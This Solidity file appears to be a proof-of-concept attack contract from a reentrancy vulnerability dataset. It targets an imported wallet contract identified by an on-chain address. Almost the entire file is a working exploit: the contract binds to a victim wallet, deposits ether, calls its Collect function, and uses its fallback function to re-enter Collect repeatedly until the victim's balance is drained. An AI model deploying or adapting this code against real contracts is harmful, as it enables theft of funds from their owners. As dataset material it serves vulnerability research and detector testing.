pragma solidity ^0.4.19;

import "../dataset/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol";


contract MaliciousContract{
    X_WALLET x_WALLET;
    

    constructor(address _victimAddress) public{
        x_WALLET= X_WALLET (_victimAddress);
    }

  function attack(uint amount) public {
        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
        x_WALLET.Collect(amount);
    }

    function deposit()  public payable{
        require(msg.value >= 1 ether, "Must add at least 1 ether");
        x_WALLET.Put.value(msg.value)(1);        
    }

    function() payable public {
        // Re-enter the vulnerable function if there's still balance to collect
        if ( address(x_WALLET).balance >= 1 ether) {
            x_WALLET.Collect(1 ether);
        }
    }
}